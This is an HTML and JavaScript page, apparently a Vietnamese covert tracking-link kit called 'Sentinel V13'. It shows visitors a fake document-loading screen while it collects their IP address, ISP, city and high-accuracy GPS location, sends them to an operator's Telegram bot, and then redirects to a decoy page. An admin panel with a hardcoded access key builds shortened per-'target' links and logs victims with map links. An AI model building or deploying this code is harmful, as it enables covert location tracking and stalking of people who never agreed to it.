<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="meta-title">H·ªá th·ªëng x√°c th·ª±c</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .admin-bg { background: #010409; }
        .glass { background: #0d1117; border: 1px solid #30363d; }
        .input-alt { background: #010409; border: 1px solid #30363d; color: #c9d1d9; font-size: 11px; }
        .input-alt:focus { border-color: #58a6ff; outline: none; transition: 0.3s; }
        .btn-green { background: #238636; border: 1px solid rgba(240,246,252,0.1); color: #fff; }
        .btn-green:hover { background: #2ea043; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
    </style>
</head>
<body class="admin-bg text-slate-400 font-sans min-h-screen">

    <div id="v-track" class="flex flex-col items-center justify-center h-screen p-6 text-center">
        <div id="ui-loader" class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <h2 id="ui-title" class="text-white text-sm font-bold uppercase tracking-widest">ƒêang t·∫£i t√†i li·ªáu...</h2>
        <p id="ui-desc" class="text-[10px] text-slate-500 mt-2 italic">Vui l√≤ng ch·ªù x√°c nh·∫≠n t·ª´ m√°y ch·ªß</p>
    </div>

    <div id="v-admin" class="hidden p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-slate-800 pb-4">
                <h1 class="text-xl font-black text-white italic tracking-tighter uppercase">Sentinel <span class="text-blue-500">V13</span></h1>
                <div class="flex gap-4 items-center">
                    <span class="text-[9px] text-green-500 font-bold animate-pulse uppercase">System Online</span>
                    <button onclick="logout()" class="text-[9px] bg-red-500/10 text-red-500 px-3 py-1.5 rounded border border-red-500/30 hover:bg-red-500/20">LOGOUT</button>
                </div>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-4 space-y-6">
                    <div class="glass p-6 rounded-2xl space-y-4 shadow-2xl">
                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest">1. C·∫•u h√¨nh h·ªá th·ªëng</h3>
                        <div class="grid grid-cols-2 gap-2">
                            <input id="in-tk" type="password" placeholder="Telegram Token" class="input-alt p-3 rounded-xl w-full">
                            <input id="in-id" type="text" placeholder="Chat ID" class="input-alt p-3 rounded-xl w-full">
                        </div>
                        <input id="in-redir" type="text" placeholder="Link ƒë√≠ch (VD: https://youtube.com)" class="w-full input-alt p-3 rounded-xl">
                        <div class="flex gap-2">
                            <input id="in-api" type="password" placeholder="Cutt.ly API Key" class="flex-1 input-alt p-3 rounded-xl">
                            <button onclick="checkAPI()" class="bg-slate-800 px-3 rounded-xl text-[9px] font-bold text-white">CHECK</button>
                        </div>
                        <button onclick="saveC()" class="w-full bg-blue-600 py-3 rounded-xl text-white text-[10px] font-bold uppercase hover:bg-blue-500">L∆∞u th√¥ng s·ªë</button>
                    </div>

                    <div class="glass p-6 rounded-2xl space-y-3">
                        <h3 class="text-green-500 text-[10px] font-black uppercase tracking-widest">2. T·∫†O LINK M·ªöI</h3>
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u (Ghi ch√∫)..." class="w-full input-alt p-3 rounded-xl">
                        <button onclick="generateLink()" class="w-full btn-green py-3 rounded-xl text-[10px] font-bold uppercase transition-all shadow-lg shadow-green-900/20">BUILD & R√öT G·ªåN</button>
                        <div id="box-link" class="hidden animate-in fade-in duration-500 space-y-2">
                            <div id="out-link" onclick="copyL(this)" class="p-4 bg-black rounded-xl border border-blue-900/50 text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center"></div>
                            <p class="text-[8px] text-center text-slate-600 italic">Nh·∫•n v√†o link tr√™n ƒë·ªÉ copy</p>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-8">
                    <div class="glass rounded-2xl overflow-hidden min-h-[550px] shadow-2xl flex flex-col">
                        <div class="p-4 bg-slate-900/50 border-b border-slate-800 flex justify-between items-center">
                            <h3 class="text-white text-[10px] font-black uppercase tracking-widest italic">Intelligence Logs</h3>
                            <button onclick="clearLogs()" class="text-[8px] text-slate-500 hover:text-red-500 font-bold uppercase">Clear Data</button>
                        </div>
                        <div class="overflow-x-auto flex-1">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black text-slate-500 uppercase text-[9px]">
                                    <tr>
                                        <th class="p-4">M·ª•c ti√™u</th>
                                        <th class="p-4">IP / Nh√† m·∫°ng</th>
                                        <th class="p-4">V·ªã tr√≠ (City)</th>
                                        <th class="p-4 text-right">Thao t√°c</th>
                                    </tr>
                                </thead>
                                <tbody id="log-table" class="divide-y divide-slate-800/30"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let cfg = { 
            t: "", 
            i: "", a: "", 
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n"
        };

        const params = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (params.has('admin')) {
                if (localStorage.getItem('auth_v13') === 'true' || prompt("Access Key:") === "123") {
                    localStorage.setItem('auth_v13', 'true');
                    document.getElementById('v-track').remove();
                    document.getElementById('v-admin').classList.remove('hidden');
                    loadAdmin();
                } else { window.location.search = ""; }
            } else { executeTracking(); }
        };

        async function executeTracking() {
            try { const v = params.get('v'); if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
            const name = params.get('name') || 'GUEST';
            
            let ipInfo = { ip: 'N/A', isp: 'N/A', city: 'N/A', lat: 0, lon: 0 };
            
            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = {
                    ip: res.ip || 'N/A',
                    isp: res.org || 'N/A',
                    city: res.city || 'N/A',
                    lat: res.latitude || 0,
                    lon: res.longitude || 0
                };
                
                // Ghi nh·∫≠t k√Ω IP ƒë·∫ßu ti√™n
                saveLog({ name, ...ipInfo, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' });
                
                const msg = `üöÄ <b>M·ª§C TI√äU: ${name}</b>\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüåê IP: <code>${ipInfo.ip}</code>\nüè¢ ISP: ${ipInfo.isp}\nüìç V√πng: ${ipInfo.city}`;
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`);
            } catch(e) { console.log("Silent Error"); }

            const finish = () => location.replace(cfg.r);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    updateLogStatus(name, 'GPS-OK', lat, lon);
                    const gpsMsg = `üéØ <b>GPS: ${name}</b>\nüìç B·∫£n ƒë·ªì: <a href="https://www.google.com/maps?q=${lat},${lon}">XEM V·ªä TR√ç</a>`;
                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(gpsMsg)}`);
                    finish();
                }, () => {
                    // N·∫øu n·∫°n nh√¢n t·ª´ ch·ªëi, d√πng t·ªça ƒë·ªô IP ghim l√™n MAP lu√¥n
                    updateLogStatus(name, 'IP-ONLY', ipInfo.lat, ipInfo.lon);
                    finish();
                }, {enableHighAccuracy: true, timeout: 5000});
            } else { finish(); }
            setTimeout(finish, 8000);
        }

        // --- H√ÄM ADMIN ---
        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('sentinel_logs_v13') || '[]');
            const table = document.getElementById('log-table');
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-blue-500/5 transition-all border-b border-slate-800/30">
                    <td class="p-4"><b class="text-white uppercase">${l.name}</b><br><span class="text-[8px] text-slate-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-slate-600 text-[8px]">${l.isp}</span></td>
                    <td class="p-4 text-[10px] text-slate-300">${l.city}</td>
                    <td class="p-4 text-right">
                        <div class="flex flex-col gap-1 items-end">
                            <span class="text-[8px] font-black italic ${l.st === 'GPS-OK' ? 'text-green-500' : 'text-yellow-600'}">${l.st}</span>
                            <div class="flex gap-2">
                                <a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="bg-blue-900/30 text-blue-400 px-2 py-0.5 rounded text-[8px] font-bold">MAP</a>
                                <a href="https://whoer.net/checkip?ip=${l.ip}" target="_blank" class="bg-slate-800 text-slate-500 px-2 py-0.5 rounded text-[8px] font-bold">WHOIS</a>
                            </div>
                        </div>
                    </td>
                </tr>`).join('');
        }

        function saveLog(d) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v13') || '[]');
            logs.unshift(d);
            localStorage.setItem('sentinel_logs_v13', JSON.stringify(logs.slice(0, 50)));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        function updateLogStatus(n, st, lat, lon) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v13') || '[]');
            if(logs.length > 0 && logs[0].name === n) {
                logs[0].st = st; logs[0].lat = lat; logs[0].lon = lon;
            }
            localStorage.setItem('sentinel_logs_v13', JSON.stringify(logs));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        function loadAdmin() {
            const saved = localStorage.getItem('cfg_v13');
            if(saved) cfg = JSON.parse(saved);
            document.getElementById('in-tk').value = cfg.t;
            document.getElementById('in-id').value = cfg.i;
            document.getElementById('in-redir').value = cfg.r;
            document.getElementById('in-api').value = cfg.a || "";
            renderLogs();
        }

        function saveC() {
            cfg.t = document.getElementById('in-tk').value;
            cfg.i = document.getElementById('in-id').value;
            cfg.r = document.getElementById('in-redir').value;
            cfg.a = document.getElementById('in-api').value;
            localStorage.setItem('cfg_v13', JSON.stringify(cfg));
            alert("ƒê√£ l∆∞u c·∫•u h√¨nh!");
        }

        async function generateLink() {
            const name = document.getElementById('in-name').value || "M·ª•c ti√™u";
            const base = window.location.href.split('?')[0];
            let finalLink = `${base}?name=${encodeURIComponent(name)}&v=${btoa(JSON.stringify(cfg))}`;
            
            // T·ª± ƒë·ªông r√∫t g·ªçn link
            if(cfg.a) {
                try {
                    const res = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(finalLink)}`).then(r => r.json());
                    if(res.url.status === 7) finalLink = res.url.shortLink;
                } catch (e) { console.log("L·ªói r√∫t g·ªçn"); }
            }
            
            const out = document.getElementById('out-link');
            out.innerText = finalLink;
            document.getElementById('box-link').classList.remove('hidden');
        }

        function clearLogs() { localStorage.removeItem('sentinel_logs_v13'); renderLogs(); }
        async function checkAPI() {
            const res = await fetch(`https://cutt.ly/api/api.php?key=${document.getElementById('in-api').value}&short=https://google.com`).then(r => r.json());
            alert(res.url.status === 7 ? "API Key OK!" : "API Key L·ªói!");
        }
        function copyL(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
        function logout() { localStorage.removeItem('auth_v13'); location.reload(); }
    </script>
</body>
</html>
